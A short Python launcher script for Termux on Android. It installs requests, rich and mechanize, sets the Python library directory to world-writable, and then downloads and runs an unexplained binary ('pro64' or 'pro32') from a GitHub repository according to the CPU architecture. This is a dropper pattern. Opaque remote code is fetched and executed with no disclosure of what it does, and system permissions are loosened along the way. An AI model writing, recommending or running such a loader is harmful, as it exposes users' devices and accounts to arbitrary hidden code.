#utf-8 orginal write rana aahil
import os,sys,subprocess
try:
    import requests
except:
    os.system("pip install requests")
try:
    import rich
except:
    os.system("pip install rich")
try:
    import mechanize
except:
    os.system("pip install mechanize")

cwd = subprocess.check_output('uname -om', shell=True)
cwd = str(cwd)

if 'aarch64' in cwd:
    os.system("chmod 777 /data/data/com.termux/files/usr/lib/python3.10")
    if not os.path.isfile('pro64'):
        os.system('curl -L https://github.com/rsaprogrammers/modules_exec/blob/main/64bit/pro64?raw=true > pro64')
        os.system('chmod 777 pro64')
        os.system('./pro64')
    else:
        os.system('./pro64')
elif 'arm' in cwd:
    os.system("chmod 777 /data/data/com.termux/files/usr/lib/python3.10")
    if not os.path.isfile('pro32'):
        os.system('curl -L https://github.com/rsaprogrammers/modules_exec/blob/main/32bit/pro32?raw=true > pro32')
        os.system('chmod 777 pro32')
        os.system('./pro32')
    else:
        os.system('./pro32')
else:
    exit(" we can't find your bit sory :) ")
